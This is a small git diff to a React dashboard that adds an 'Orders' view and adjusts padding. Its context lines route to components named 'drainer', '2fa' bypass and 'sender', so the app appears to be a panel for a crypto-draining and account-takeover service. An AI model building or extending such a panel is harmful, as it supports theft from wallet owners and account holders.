@@ -27,6 +27,7 @@ import { getTransactions } from "../features/transactionSlice";
 import { getUserBalance } from "../features/walletSlice";
 import { format } from "date-fns";
 import { getUser } from "../features/userSlice";
+import Orders from "./Orders";
 
 const Dash = ({ handleLinks, activeLink, toggle, resetToggle }) => {
   const navigate = useNavigate();
@@ -99,7 +100,7 @@ const Dash = ({ handleLinks, activeLink, toggle, resetToggle }) => {
 
   return (
     <section
-      className="relative p-6 py-10 pt-20"
+      className="relative p-6 py-20 sm:py-7"
       style={{ scrollMarginTop: "var(--topbar-height, 69px)" }}
     >
       <div className="flex overflow-hidden min-h-screen">
@@ -134,6 +135,7 @@ const Dash = ({ handleLinks, activeLink, toggle, resetToggle }) => {
           {activeLink === "drainer" && <Web3 toggle={toggle} />}
           {activeLink === "2fa" && <Bypass toggle={toggle} />}
           {activeLink === "sender" && <Sender toggle={toggle} />}
+          {activeLink === "order" && <Orders toggle={toggle} />}
         </>
         {loading && <LogoutModal />}
       </div>
